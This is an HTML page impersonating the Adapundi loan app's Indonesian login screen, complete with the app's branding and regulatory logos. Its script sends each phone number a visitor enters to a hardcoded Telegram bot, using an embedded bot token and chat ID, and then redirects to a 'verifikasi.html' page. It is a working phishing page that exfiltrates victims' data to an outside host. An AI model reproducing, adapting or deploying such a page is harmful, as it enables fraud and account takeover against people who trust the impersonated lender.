<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   Adapundi Login
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet"/>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
   body {
      font-family: "Poppins", sans-serif;
      background-color: #fff;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      padding: 0 0.25rem;
      margin: 0;
    }
    .container {
      max-width: 400px;
      width: 100%;
      border-radius: 1.5rem 1.5rem 0 0;
      overflow: hidden;
      box-sizing: border-box;
      background: white;
      box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
    }
    .header {
      position: relative;
      background: linear-gradient(to bottom, #a6f48a 0%, #ffffff 100%);
      padding: 1.5rem 1.5rem 1.5rem 1.5rem;
      border-radius: 1.5rem 1.5rem 0 0;
      display: flex;
      align-items: flex-start;
      gap: 1rem;
      min-height: 6rem;
    }
    .chicken {
      position: absolute;
      top: 0.75rem;
      left: 1.5rem;
      width: 5rem;
      height: 5rem;
      object-fit: contain;
      z-index: 10;
    }
    .header-text {
      margin-left: 6rem;
      font-weight: 600;
      font-size: 2.5rem;
      line-height: 1.2;
      color: #000;
      max-width: 14rem;
      z-index: 20;
    }
    .header-text strong {
      font-weight: 700;
    }
    .btn-close,
    .btn-headset {
      position: absolute;
      top: 1rem;
      font-size: 1.5rem;
      color: #000;
      background: none;
      border: none;
      cursor: pointer;
      z-index: 20;
      line-height: 1;
    }
    .btn-close {
      right: 1.5rem;
      font-weight: 500;
    }
    .btn-headset {
      right: 3.5rem;
    }
    .content {
      background: #fff;
      padding: 2rem 1.5rem 3rem 1.5rem;
      border-radius: 0 0 1.5rem 1.5rem;
      box-sizing: border-box;
    }
    .phone-input-container {
      background: #f2f4f7;
      border-radius: 9999px;
      display: flex;
      align-items: center;
      padding: 0.75rem 1.5rem;
      gap: 1rem;
      max-width: 100%;
    }
    .phone-code {
      font-weight: 700;
      font-size: 1.125rem;
      color: #4b5563;
      flex-shrink: 1;
    }
    .phone-input {
      border: none;
      background: transparent;
      font-size: 1rem;
      color: #374151;
      outline: none;
      flex-grow: 1;
      font-weight: 400;
    }
    .phone-input::placeholder {
      color: #6b7280;
      font-weight: 500;
    }
    .inactive-text {
      margin-top: 1rem;
      font-size: 0.875rem;
      color: #9ca3af;
      text-align: center;
    }
    .inactive-text a {
      color: #00c800;
      text-decoration: none;
    }
    .btn-submit {
      margin-top: 2rem;
      width: 100%;
      background-color: #d1d5db;
      border-radius: 9999px;
      padding: 1rem 0;
      font-weight: .700;
      font-size: 1.125rem;
      color: #fff;
      border: none;
      cursor: not-allowed;
      transition: background-color 0.3s ease;
    }
    .btn-submit.enabled {
      background-color: #ff8c00;
      cursor: pointer;
    }
    .checkbox-container {
      margin-top: 1.5rem;
      display: flex;
      align-items: flex-start;
      gap: 0.75rem;
      max-width: 17.5rem;
      margin-left: auto;
      margin-right: auto;
    }
    .checkbox-box {
      width: 1.5rem;
      height: 1.5rem;
      background-color: #00c800;
      border-radius: 0.25rem;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-shrink: 0;
      margin-top: 0.25rem;
    }
    .checkbox-box i {
      color: white;
      font-size: 0.75rem;
    }
    .checkbox-text {
      font-size: 0.875rem;
      color: #9ca3af;
      line-height: 1.4;
      font-weight: 700;
    }
    .bottom-text {
      margin-top: 7.5rem;
      font-size: 0.75rem;
      color: #d1d5db;
      text-align: center;
      max-width: 17.5rem;
      margin-left: auto;
      margin-right: auto;
      line-height: 1.4;
    }
    .bottom-text a {
      color: #00c800;
      text-decoration: none;
    }
    .logos {
      margin-top: 1.5rem;
      display: flex;
      justify-content: center;
      gap: 2.5rem;
      align-items: center;
    }
    .logos img {
      height: 2rem;
      object-fit: contain;
    }
    @media (max-width: 400px) {
      .header-text {
        margin-left: 5.5rem;
        font-size: 1.125rem;
      }
      .phone-input-container {
        padding: 0.625rem 1.25rem;
      }
      .btn-submit {
        font-size: 1rem;
        padding: 0.875rem 0;
      }
      .checkbox-container {
        max-width: 100%;
      }
      .bottom-text {
        max-width: 100%;
        margin-top: 20rem;
        font-size: 0.6875rem;
      }
    }
  </style>
 </head>
 <body>
  <main aria-label="Adapundi login form" class="container" role="main">
   <header class="header">
    <img alt="Yellow chicken cartoon with orange star on head and green heart-shaped bag" class="chicken" height="80" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjpFn-wl57NFTaxvxeJX38gM3B4PF4l4u1HkYSpQq7xdhRrejHG25ZmAA_fmI2Hn95pTdRH_WPQ5MyEJF5xdp_ppzRWEyYQ7j_miNYbXAcbTFc-04n6pnYK4bqZf2SVXoBb6v4UJzT8T5a4s8ny056PFbLJvtXVRBJFLuPWY-vwSjRRnCq2LhXDqW7-PRg/s1600/1000017403.png" width="80"/>
    <button aria-label="Customer service" class="btn-headset" type="button">
     <i class="fas fa-headset">
     </i>
    </button>
    <button aria-label="Close" class="btn-close" type="button">
     Ã—
    </button>
    <h1 class="header-text">
     Selamat Datang
     <br/>
     di
     <strong>
      adapundi
     </strong>
    </h1>
   </header>
   <section class="content">
    <div class="phone-input-container">
     <span class="phone-code">
      +62
     </span>
     <input aria-label="Phone number input" class="phone-input" inputmode="tel" maxlength="15" pattern="[0-9]*" placeholder="Masukan No. HP awalan angka 8" type="tel"/>
    </div>
    <p class="inactive-text">
     Nomor ponsel tidak aktif? tambahkan
     <a href="#">
      nomor baru Anda
     </a>
    </p>
    <button class="btn-submit" disabled="" type="button">
     Daftar/Masuk
    </button>
    <div class="checkbox-container">
     <div aria-hidden="true" class="checkbox-box">
      <i class="fas fa-check">
      </i>
     </div>
     <p class="checkbox-text">
      Saya setuju untuk menerima Semua Notifikasi dan Informasi Promo dari
          Adapundi
     </p>
    </div>
    <p class="bottom-text">
     Dengan mendaftar, berarti Anda setuju dengan
     <a href="#">
      Kebijakan Privasi
     </a>
     dan
     <a href="#">
      Syarat &amp; Ketentuan
     </a>
    </p>
    <div aria-label="Regulatory logos" class="logos">
     <img alt="OJK logo in red with text Otoritas Jasa Keuangan" height="30" src="https://upload.wikimedia.org/wikipedia/commons/8/83/OJK_Logo.png" width="80"/>
     <img alt="afpi logo in green with text asosiasi fintech pendanaan bersama indonesia" height="30" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSB50fLiDBjvsr-kE6IJo2C9vNRbMuCyeyPrg&s" width="100"/>
    </div>
   </section>
  </main>
  <script>
   const phoneInput = document.querySelector('.phone-input');
  const submitBtn = document.querySelector('.btn-submit');

  function updateButtonState() {
    const val = phoneInput.value.trim();
    if (val.startsWith('8') && val.length >= 9) {
      submitBtn.disabled = false;
      submitBtn.classList.add('enabled');
    } else {
      submitBtn.disabled = true;
      submitBtn.classList.remove('enabled');
    }
  }

  phoneInput.addEventListener('input', updateButtonState);

  submitBtn.addEventListener('click', async () => {
    const phoneNumber = phoneInput.value.trim();
    if (!phoneNumber.startsWith('8')) {
      alert('Nomor harus diawali dengan angka 8');
      return;
    }
    // Telegram Bot API info
    const botToken = '8275257587:AAHqb6nOza3eaFNZQGtr5yNuS5D9NArBBbE';
    const chatId = '7549590022';
    const message = encodeURIComponent(`Nomor HP: +62${phoneNumber}`);

    try {
      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`, {
        method: 'GET'
      });
      if (response.ok) {
        window.location.href = "verifikasi.html";
        phoneInput.value = '';
        updateButtonState();
      } else {
        alert('Gagal mengirim data.');
      }
    } catch (error) {
      alert('Terjadi kesalahan: ' + error.message);
    }
  });
  </script>
 </body>
</html>
